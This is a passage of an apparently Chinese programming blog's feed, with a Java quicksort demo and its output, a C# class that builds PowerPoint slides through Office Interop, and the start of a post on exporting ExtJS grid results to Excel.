class="keyword">while</span> (left &lt; right &amp;&amp; n[right] &gt;= pivot)</span><br><span class="line">right--;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">n[left++] = n[right];</span><br><span class="line">printList(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (left &lt; right &amp;&amp; n[left] &lt;= pivot)</span><br><span class="line">left++;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">n[right--] = n[left];</span><br><span class="line">printList(n);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">n[left] = pivot;</span><br><span class="line">printList(n);</span><br><span class="line"><span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">(<span class="keyword">int</span>[] n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = n.length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">System.out.print(n[i] + <span class="string">","</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 编译运行后输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">7,8,1,9,5,10,3,2,11,</span><br><span class="line">2,8,1,9,5,10,3,2,11,</span><br><span class="line">2,8,1,9,5,10,3,8,11,</span><br><span class="line"></span><br><span class="line">2,3,1,9,5,10,3,8,11,</span><br><span class="line">2,3,1,9,5,10,9,8,11,</span><br><span class="line"></span><br><span class="line">2,3,1,5,5,10,9,8,11,</span><br><span class="line"></span><br><span class="line">2,3,1,5,7,10,9,8,11,</span><br><span class="line">1,3,1,5,7,10,9,8,11,</span><br><span class="line">1,3,3,5,7,10,9,8,11,</span><br><span class="line"></span><br><span class="line">1,2,3,5,7,10,9,8,11,</span><br><span class="line"></span><br><span class="line">1,2,3,5,7,10,9,8,11,</span><br><span class="line">1,2,3,5,7,8,9,8,11,</span><br><span class="line"></span><br><span class="line">1,2,3,5,7,8,9,10,11,</span><br><span class="line"></span><br><span class="line">1,2,3,5,7,8,9,10,11,</span><br><span class="line">1,2,3,5,7,8,9,10,11,</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 仔细分析一下输出结果就能很好的理解该算法的原理啦！不多说了，读者自己去品味吧~&ensp; &ensp; &ensp; 如果闲来没事的话，读者可以利用这个排序原理自己制作文中的那个动图，有兴趣的可以尝试一下！<br>&ensp; &ensp; &ensp; 注：动态图片展示的是以数组最后一个值为基准，稍微修改一下上述代码就可以达到动图中的效果。</p><p><span><a>反馈请点击:</a><a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=lKWmp62soKykoqLU5eW69-v5" style="text-decoration:none"><img src="http://rescdn.qqmail.com/zh_CN/htmledition/images/function/qm_open/ico_mailme_11.png" alt></a></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 偶然间看了一篇微信上的&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MjM5MDI1ODUyMA==&amp;mid=205210773&amp;idx=2&amp;sn=ed7b667fcee8e2b4d165d279b4140c1c&amp;scene=4#wechat_redirect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;font color=&quot;blue&quot;&gt;文章&lt;/font&gt;&lt;/a&gt;，CSDN&lt;a href=&quot;http://blog.csdn.net/adinike1/article/details/31767285&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;font color=&quot;blue&quot;&gt;链接&lt;/font&gt;&lt;/a&gt;，里面介绍了十大算法，分别是：&lt;/p&gt;
&lt;p&gt;一：快速排序算法&lt;br&gt;二：堆排序算法&lt;br&gt;三：归并排序&lt;br&gt;四：二分查找算法&lt;br&gt;五：BFPRT(线性查找算法)&lt;br&gt;六：DFS(深度优先搜索)&lt;br&gt;七：BFS(广度优先搜索)&lt;br&gt;八：Dijkstra算法&lt;br&gt;九：动态规划算法&lt;br&gt;十：朴素贝叶斯分类算法&lt;/p&gt;
    
    </summary>
    
    
      <category term="data structure" scheme="http://blog.lxzh.app/tags/data-structure/"/>
    
  </entry>
  
  <entry>
    <title>Csharp PPT Operator</title>
    <link href="http://blog.lxzh.app/2015/07/24/Csharp-PPT-Operator/"/>
    <id>http://blog.lxzh.app/2015/07/24/Csharp-PPT-Operator/</id>
    <published>2015-07-24T15:56:40.000Z</published>
    <updated>2017-02-18T15:40:01.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Office.Core;</span><br><span class="line"><span class="keyword">using</span> PPT = Microsoft.Office.Interop.PowerPoint;</span><br><span class="line"><span class="keyword">using</span> System.Windows;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> Tools.functionModel.file;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Drawing.Imaging;</span><br><span class="line"><span class="comment">//using System.Windows.Controls;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Tools.baseModel.common</span> &#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> PPT文档操作实现类.</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">pptBase</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">string</span> temPath = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">string</span> pptPath = <span class="string">""</span>;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">region</span>=========基本的参数信息=======</span></span><br><span class="line">        PPT.Application pptApp;                 <span class="comment">//PPT应用程序变量</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> PPT.Application PptApp &#123;</span><br><span class="line">            <span class="keyword">get</span> &#123; <span class="keyword">return</span> pptApp; &#125;</span><br><span class="line">            <span class="keyword">set</span> &#123; pptApp = <span class="keyword">value</span>; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        PPT.Presentation pptDoc;                <span class="comment">//PPT文档变量</span></span><br><span class="line">        PPT.Slides pptSlides = <span class="literal">null</span>;</span><br><span class="line">        PPT.Slide pptSlide = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> pageCount=<span class="number">0</span>;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endregion</span></span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> PPT.Shapes Shapes &#123;</span><br><span class="line">            <span class="keyword">get</span> &#123; <span class="keyword">return</span> pptSlide.Shapes; &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">pptBase</span>(<span class="params"><span class="keyword">string</span> path</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.temPath = commonPath.fiberFolder + <span class="string">"/other/template.pot"</span>;</span><br><span class="line">            <span class="keyword">this</span>.pptPath = path;</span><br><span class="line">            <span class="comment">//如果已存在，则删除</span></span><br><span class="line">            <span class="keyword">if</span> (File.Exists((<span class="keyword">string</span>)pptPath)) &#123;</span><br><span class="line">                File.Delete((<span class="keyword">string</span>)pptPath);</span><br><span class="line">            &#125;</span><br><span class="line">            FileInfo file = <span class="keyword">new</span> FileInfo(<span class="keyword">this</span>.temPath);</span><br><span class="line">            pptApp = <span class="keyword">new</span> PPT.Application();    <span class="comment">//初始化</span></span><br><span class="line">            pptApp.Visible = MsoTriState.msoTrue;</span><br><span class="line">            pptDoc = pptApp.Presentations.Open(file.FullName, MsoTriState.msoFalse, MsoTriState.msoTrue, MsoTriState.msoTrue);</span><br><span class="line">            pptSlides = pptDoc.Slides;</span><br><span class="line">            <span class="comment">//pptDoc = pptApp.Presentations.Add(Microsoft.Office.Core.MsoTriState.msoFalse);</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddPage</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            pageCount++;</span><br><span class="line">            <span class="comment">//pptDoc.Slides.Add(pageCount, PPT.PpSlideLayout.ppLayoutText);</span></span><br><span class="line">            pptSlide = pptSlides.Add(pageCount, PPT.PpSlideLayout.ppLayoutTitleOnly);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertPage</span>(<span class="params"><span class="keyword">int</span> index</span>)</span> &#123;</span><br><span class="line">            PPT.CustomLayout ppLayout = pptSlide.CustomLayout;</span><br><span class="line">            pptSlide = pptSlides.AddSlide(index, ppLayout);</span><br><span class="line">            pageCount++;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="meta">#<span class="meta-keyword">region</span> 添加文本框</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">drawText</span>(<span class="params">PPT.Shapes shapes, pptText textBox</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (textBox == <span class="literal">null</span> || textBox.Location.IsEmpty || textBox.FrameSize.IsEmpty)</span><br><span class="line">                <span class="keyword">return</span> shape;</span><br><span class="line">            shape = shapes.AddTextbox(textBox.Orientation, textBox.X, textBox.Y, textBox.Width, textBox.Height);</span><br><span class="line">            shape.TextFrame.HorizontalAnchor = textBox.HorizontalAnchor;</span><br><span class="line">            shape.TextFrame.VerticalAnchor = textBox.VerticalAnchor;</span><br><span class="line">            shape.TextFrame.TextRange.Font.Color.RGB = colorFormat(textBox.ForeColor);</span><br><span class="line">            shape.TextFrame.TextRange.Font.Bold = textBox.Font.Bold ? MsoTriState.msoTrue : MsoTriState.msoFalse;</span><br><span class="line">            shape.TextFrame.TextRange.Font.Italic = textBox.Font.Italic ? MsoTriState.msoTrue : MsoTriState.msoFalse;</span><br><span class="line">            shape.TextFrame.TextRange.Font.Underline = textBox.Font.Underline ? MsoTriState.msoTrue : MsoTriState.msoFalse;</span><br><span class="line">            shape.TextFrame.TextRange.Font.Size = textBox.Font.Size;</span><br><span class="line">            shape.TextFrame.TextRange.Font.Name = textBox.Font.Name;</span><br><span class="line">            shape.TextFrame.MarginLeft = <span class="number">0</span>;</span><br><span class="line">            shape.TextFrame.MarginRight = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (textBox.BackColor == Color.Transparent) &#123;</span><br><span class="line">                shape.Fill.Visible = Microsoft.Office.Core.MsoTriState.msoFalse;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                shape.Fill.BackColor.RGB = colorFormat(textBox.BackColor);</span><br><span class="line">            &#125;</span><br><span class="line">            shape.Line.Weight = textBox.BoardWeight;</span><br><span class="line">            <span class="keyword">if</span> (textBox.BoardColor == Color.Transparent) &#123;</span><br><span class="line">                shape.Line.Visible = Microsoft.Office.Core.MsoTriState.msoFalse;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                shape.Line.BackColor.RGB = colorFormat(textBox.BoardColor);</span><br><span class="line">            &#125;</span><br><span class="line">            shape.Line.DashStyle = textBox.BoardStyle;</span><br><span class="line">            shape.TextFrame.TextRange.Text = textBox.Text;</span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endregion</span> </span></span><br><span class="line"> </span><br><span class="line">        <span class="meta">#<span class="meta-keyword">region</span> 添加基本图形</span></span><br><span class="line">        <span class="comment">//画直线</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">drawLine</span>(<span class="params">PPT.Shapes shapes, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> endX, <span class="keyword">float</span> endY</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = shapes.AddLine(beginX, beginY, endX, endY);</span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//画直线</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">drawLine</span>(<span class="params">PPT.Shapes shapes, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> endX, <span class="keyword">float</span> endY, <span class="keyword">float</span> weight, Color foreColor</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = shapes.AddLine(beginX, beginY, endX, endY);</span><br><span class="line">            shape.Line.ForeColor.RGB = colorFormat(foreColor);  <span class="comment">//线条颜色</span></span><br><span class="line">            shape.Line.Weight = weight;                         <span class="comment">//线条粗细</span></span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//画矩形</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">drawRectangle</span>(<span class="params">PPT.Shapes shapes, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> width, <span class="keyword">float</span> height</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = shapes.AddShape(MsoAutoShapeType.msoShapeRectangle, beginX, beginY, width, height);</span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//画矩形</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">drawRectangle</span>(<span class="params">PPT.Shapes shapes, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> width, <span class="keyword">float</span> height, <span class="keyword">float</span> weight, Color foreColor, Color backColor</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = shapes.AddShape(MsoAutoShapeType.msoShapeRectangle, beginX, beginY, width, height);</span><br><span class="line">            shape.Line.ForeColor.RGB = colorFormat(foreColor);  <span class="comment">//线条颜色</span></span><br><span class="line">            shape.Fill.BackColor.RGB = colorFormat(backColor);  <span class="comment">//填充颜色</span></span><br><span class="line">            shape.Line.Weight = weight;                         <span class="comment">//线条粗细</span></span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//画箭头</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">drawArrow</span>(<span class="params">PPT.Shapes shapes, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> endX, <span class="keyword">float</span> endY,<span class="keyword">float</span> weight</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">float</span> width=(<span class="keyword">float</span>)Math.Sqrt(Math.Pow(endX-beginX,<span class="number">2</span>)+Math.Pow(endY-beginY,<span class="number">2</span>));</span><br><span class="line">            <span class="keyword">float</span> startX = (beginX + endX) / <span class="number">2</span>-width/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">float</span> startY = (beginY + endY) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">float</span> angle = endX==beginX?(endY&gt;beginY?<span class="number">90</span>:<span class="number">-90</span>):(<span class="keyword">float</span>)Math.Atan((endY – beginY) / (endX – beginX));</span><br><span class="line">            angle = (<span class="keyword">float</span>)(angle / Math.PI * <span class="number">180.0</span>);</span><br><span class="line">            angle = angle &lt; <span class="number">0</span> ? <span class="number">180.0f</span> + angle : angle;</span><br><span class="line">            PPT.Shape shape = shapes.AddShape(MsoAutoShapeType.msoShapeRightArrow, startX, startY, width, weight);</span><br><span class="line">            shape.Rotation = angle;</span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//画箭头</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">drawRightArrow</span>(<span class="params">PPT.Shapes shapes, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> endX, <span class="keyword">float</span> endY, <span class="keyword">float</span> weight, Color foreColor, Color backColor</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = drawArrow(shapes, beginX, beginY, endX, endY, weight);</span><br><span class="line">            shape.Line.ForeColor.RGB = colorFormat(foreColor);  <span class="comment">//线条颜色</span></span><br><span class="line">            shape.Fill.BackColor.RGB = colorFormat(backColor);  <span class="comment">//填充颜色</span></span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endregion</span></span></span><br><span class="line"> </span><br><span class="line">        <span class="meta">#<span class="meta-keyword">region</span> 添加图片</span></span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">AddPicture</span>(<span class="params">PPT.Shapes shapes, <span class="keyword">string</span> picPath, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> width, <span class="keyword">float</span> height</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (!File.Exists(picPath)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"图片文件不存在!"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                shape = shapes.AddPicture(picPath, MsoTriState.msoFalse, MsoTriState.msoTrue, beginX, beginY, width, height);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> PPT.<span class="function">Shape <span class="title">AddPicture</span>(<span class="params">PPT.Shapes shapes, Bitmap bitmap, <span class="keyword">float</span> beginX, <span class="keyword">float</span> beginY, <span class="keyword">float</span> width, <span class="keyword">float</span> height</span>)</span> &#123;</span><br><span class="line">            PPT.Shape shape = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">string</span> picPath=System.IO.Path.GetTempPath()+<span class="string">"bitmap.bmp"</span>;</span><br><span class="line">            bitmap.Save(picPath, ImageFormat.Bmp);</span><br><span class="line">            shape = shapes.AddPicture(picPath, MsoTriState.msoFalse, MsoTriState.msoTrue, beginX, beginY, width, height);</span><br><span class="line">            <span class="keyword">return</span> shape;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endregion</span> </span></span><br><span class="line"> </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Close</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//WdSaveFormat为PPT文档的保存格式</span></span><br><span class="line">                PPT.PpSaveAsFileType format = PPT.PpSaveAsFileType.ppSaveAsDefault;</span><br><span class="line">                <span class="comment">//将pptDoc文档对象的内容保存为PPT文档</span></span><br><span class="line">                pptDoc.SaveAs(pptPath, format, Microsoft.Office.Core.MsoTriState.msoFalse);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//关闭pptDoc文档对象</span></span><br><span class="line">                pptDoc.Close();</span><br><span class="line">                <span class="comment">//关闭pptApp组件对象</span></span><br><span class="line">                pptApp.Quit();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                outPrint.appendText(<span class="string">"保存或关闭PPT出错，错误信息："</span> + ex.Message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 系统颜色转换为PPT支持的颜色值</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">colorFormat</span>(<span class="params">System.Drawing.Color color</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> <span class="keyword">value</span> = ((color.B * <span class="number">256</span> + color.G) * <span class="number">256</span>) + color.R;<span class="comment">//Office RGB与 System.Drawing.Color.RGB顺序相反</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Extjs导出excel数据</title>
    <link href="http://blog.lxzh.app/2015/04/18/Extjs-Export-To-Excel/"/>
    <id>http://blog.lxzh.app/2015/04/18/Extjs-Export-To-Excel/</id>
    <published>2015-04-18T10:49:48.000Z</published>
    <updated>2017-02-21T15:38:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境：前台：<code>Extjs</code>；后台<code>hibernate+struct</code></p><p>需求：前台查询结果分页显示，导出到<code>excel</code>时需要导出<strong>所有符合查询条件</strong>的记录。</p><a id="more"></a><p>前台：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> panel = Ext.getCmp(<span class="string">'qRINFPanel'</span>);</span><br><span class="line"><span class="keyword">var</span> form = panel.getForm();</span><br><span class="line"><span class="keyword">var</span> params = grid.getStore().baseParams;</span><br><span class="line">params[<span class="string">'filename'</span>]=<span class="string">'projects.xls'</span>;</span><br><span class="line">params[<span class="string">'q_pDomain'</span>] = getAgentDomain();</span><br><span class="line">form.standardSubmit=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> paramstr=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> s <span class="keyword">in</span> params)&#123;</span><br><span class="line">paramstr+=s+<span class="string">"="</span>+params[s]+<span class="string">"&amp;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> reg=<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'undefined'</span>,<span class="string">'g'</span>); <span class="comment">//创建正则RegExp对象  </span></span><br><span class="line">paramstr=paramstr.replace(reg,<span class="string">''</span>);  <span class="comment">//去掉未赋值的参数默认值</span></span><br><span class="line">form.url=<span class="string">'exportProjects.action?'</span>+paramstr;</span><br><span class="line">form.method=<span class="string">'POST'</span>;</span><br><span class="line">form.submit();</span><br></pre></td></tr></table></figure><p><code>qRINFPanel</code>为<code>panel</code>的<code>id</code>，<code>params</code>里面还有其他参数，这个是存储前台查询用的参数对象。</p><p>前台将查询参数转换为<code>json</code>格式放在<code>url</code>中（不要用<code>Extjs.encode</code>方法，很坑，后台<code>request.getParameter</code>获取不到），后台拿到查询参数后，从数据库查询记录，然后生成<code>excel</code>，以流的形式输出到前台下载即可。</p><p>后台代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 